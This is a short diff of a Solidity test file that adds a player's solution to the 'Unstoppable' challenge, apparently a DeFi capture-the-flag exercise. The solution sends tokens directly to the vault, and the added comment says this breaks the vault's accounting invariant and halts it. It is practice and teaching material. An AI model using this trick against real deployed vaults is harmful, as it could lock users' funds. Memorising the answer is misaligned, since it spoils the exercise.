@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // This broke the invariant that balance can only be changed through deposit/withdraw functions
+        token.transfer(address(vault),INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
